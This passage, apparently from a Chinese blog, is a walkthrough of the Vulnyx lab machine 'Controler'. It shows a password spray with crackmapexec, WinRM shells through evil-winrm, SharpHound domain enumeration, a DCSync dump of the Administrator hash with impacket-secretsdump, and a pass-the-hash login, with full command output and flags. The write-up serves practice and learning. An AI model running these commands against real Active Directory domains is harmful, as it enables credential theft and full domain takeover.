+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span> -u j<span class="hljs-selector-class">.levy</span> -<span class="hljs-selector-tag">p</span> rockyou<span class="hljs-selector-class">.txt</span>         <br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:CONTROLER) (domain:control.nyx) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[-]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:<span class="hljs-number">123456</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[-]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:<span class="hljs-number">12345</span> STATUS_LOGON_FAILURE <br>.......<br>SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">445</span>    CONTROLER        <span class="hljs-selector-attr">[+]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:Password1 <br></code></pre></td></tr></table></figure>
+
+<p>得到密码Password1</p>
+<p>用winrm可以拿到shell。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nxc winrm <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span> -u j<span class="hljs-selector-class">.levy</span> -<span class="hljs-selector-tag">p</span> Password1<br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:CONTROLER) (domain:control.nyx) <br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[+]</span> control.nyx\j<span class="hljs-selector-class">.levy</span>:Password1 (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smali">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># evil-winrm -i 192.168.56.117 -u &#x27;j.levy&#x27; -p &quot;Password1&quot;               </span><br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline<br>                                        <br>Data: For more information,<span class="hljs-built_in"> check </span>Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<p>拿到userflag。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; dir<br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; cd ..<br>*Evil-WinRM* PS C:\Users\j.levy&gt; cd Desktop<br>*Evil-WinRM* PS C:\Users\j.levy\Desktop&gt; dir<br><br><br>    Directory: C:\Users\j.levy\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       10/22/2024   2:40 PM             70 user.txt<br><br><br>*Evil-WinRM* PS C:\Users\j.levy\Desktop&gt; cat user.txt<br>587c4dac7a29c5c2a2d98732116e5bee<br>*Evil-WinRM* PS C:\Users\j.levy\Desktop&gt; <br><br></code></pre></td></tr></table></figure>
+
+<h3 id="GetAdmin"><a href="#GetAdmin" class="headerlink" title="GetAdmin"></a>GetAdmin</h3><hr>
+<p>用bloodhound分析域，上传sharphound。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; upload /home/kali/Desktop/SharpHound.exe<br>                                        <br>Info: Uploading /home/kali/Desktop/SharpHound.exe to C:\Users\j.levy\Documents\SharpHound.exe<br>                                        <br>Data: 1715540 bytes of 1715540 bytes copied<br>                                        <br>Info: Upload successful!<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs shell">*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; .\SharpHound.exe -c All -d control.nyx<br>2025-06-11T17:40:46.0437737-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound<br>2025-06-11T17:40:46.1687827-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry<br>2025-06-11T17:40:46.1687827-07:00|INFORMATION|Initializing SharpHound at 5:40 PM on 6/11/2025<br>2025-06-11T17:40:46.3583738-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry<br>2025-06-11T17:40:46.3867934-07:00|INFORMATION|Beginning LDAP search for control.nyx<br>2025-06-11T17:40:46.4974100-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CONTROL.NYX<br>2025-06-11T17:40:46.5902495-07:00|INFORMATION|Beginning LDAP search for control.nyx Configuration NC<br>2025-06-11T17:40:46.5902495-07:00|INFORMATION|Producer has finished, closing LDAP channel<br>2025-06-11T17:40:46.5902495-07:00|INFORMATION|LDAP channel closed, waiting for consumers<br>2025-06-11T17:40:46.7156535-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CONTROL.NYX<br>2025-06-11T17:40:46.9349151-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CONTROL.NYX<br>2025-06-11T17:40:52.4847691-07:00|INFORMATION|Consumers finished, closing output channel<br>2025-06-11T17:40:52.5245244-07:00|INFORMATION|Output channel closed, waiting for output task to complete<br>Closing writers<br>2025-06-11T17:40:52.5968654-07:00|INFORMATION|Status: 298 objects finished (+298 49.66667)/s -- Using 39 MB RAM<br>2025-06-11T17:40:52.5968654-07:00|INFORMATION|Enumeration finished in 00:00:06.1712809<br>2025-06-11T17:40:52.6228715-07:00|INFORMATION|Saving cache with stats: 15 ID to type mappings.<br> 0 name to SID mappings.<br> 1 machine sid mappings.<br> 3 sid to domain mappings.<br> 0 global catalog mappings.<br>2025-06-11T17:40:52.6228715-07:00|INFORMATION|SharpHound Enumeration Completed at 5:40 PM on 6/11/2025! Happy Graphing!<br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; dir<br><br><br>    Directory: C:\Users\j.levy\Documents<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        6/11/2025   5:40 PM          25769 20250611174047_BloodHound.zip<br>-a----        6/11/2025   5:40 PM           1288 MWMwNWZhMWQtNWU5Yi00ZGZhLTgzZDEtMDE5NjRmMmE2NWEw.bin<br>-a----        6/11/2025   5:39 PM        1286656 SharpHound.exe<br><br><br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; download 20250611174047_BloodHound.zip<br>                                        <br>Info: Downloading C:\Users\j.levy\Documents\20250611174047_BloodHound.zip to 20250611174047_BloodHound.zip<br>                                        <br>Info: Download successful!<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/11/Vulnyx-Controler/msedge_mpQzCnreXM.png" srcset="/img/loading.gif" lazyload></p>
+<p>帮我们分析出这个用户可以执行DCsync攻击，还贴心的准备好了命令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">impacket-secretsdump &#x27;control.nyx&#x27;/&#x27;j.levy&#x27;:&#x27;Password1&#x27;@&#x27;192.168.56.117&#x27; -just-dc-user administrator<br>/usr/lib/python3/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  import pkg_resources<br>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:48b20d4f3ea31b7234c92b71c90fbff7:::<br>[*] Kerberos keys grabbed<br>Administrator:aes256-cts-hmac-sha1-96:9a8c983c709e851258912c3b1d71c9b05faf1724f522b4f32e57f7bef3366773<br>Administrator:aes128-cts-hmac-sha1-96:0ca176565c5b47fda5e2ab4f53fbb9d3<br>Administrator:des-cbc-md5:ce9785d980c1a7f8<br>[*] Cleaning up... <br><br></code></pre></td></tr></table></figure>
+
+<p>成功抓取到域管理员的哈希，最后evil-winrm登上去就行了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# evil-winrm -i 192.168.56.117 -u &#x27;administrator&#x27; -H &quot;48b20d4f3ea31b7234c92b71c90fbff7&quot;<br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..<br>*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir<br><br><br>    Directory: C:\Users\Administrator\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       10/22/2024   2:41 PM             70 root.txt<br><br><br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt<br>b43e4c1b7df273b73966bc038774bafd<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+        <a href="/tags/Vulnyx/" class="print-no-link">#Vulnyx</a>
+      
+        <a href="/tags/%E5%9F%9F/" class="print-no-link">#域</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Vulnyx-Controler</div>
+      <div>http://example.com/2025/06/11/Vulnyx-Controler/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>June 11, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/08/HackMyVM-Yansi/" title="HackMyVM-Yansi">
+                        <span class="hidden-mobile">HackMyVM-Yansi</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
